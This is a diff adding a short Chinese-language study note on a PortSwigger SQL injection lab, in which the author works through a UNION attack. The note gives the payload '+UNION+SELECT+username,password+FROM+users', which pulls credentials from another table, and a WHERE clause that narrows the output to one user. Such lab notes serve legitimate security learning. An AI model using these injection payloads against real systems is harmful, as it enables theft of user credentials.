@@ -1,0 +1,37 @@
+靶场地址: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+
+###
+依旧是SQL注入,只是这一次多了 from users
+我原来想的是把 category改成 users -> 图1
+但 users和 products 都是 FROM的 表名(标识符)
+=>
+我中间还犯了一个错,py: 
+1. username是变量名(列名),不能加 ''
+2. 'wiener' 是一个字符串元素,要加 ''
+
+###
+图1的后端大概长这样:
+SELECT ???,???
+FROM products
+WHERE category='Pets'
+=>
+我改成了这样:
+SELECT ???,???
+FROM products
+WHERE category='users'
+UNION
+SELECT username,password
+
+###
+账密应该从另一个表单里面去找    -> 图3
+SQL: '+UNION+SELECT+username,password+FROM+users
+SELECT ???,???
+FROM products
+WHERE category='users'
+SELECT username,password
+FROM users
+
+补:
+如果你的想法再多一点    -> 图5,图6
+SQL加上: +WHERE+username='wiener'
+那么,response里面就只有wiener的账密
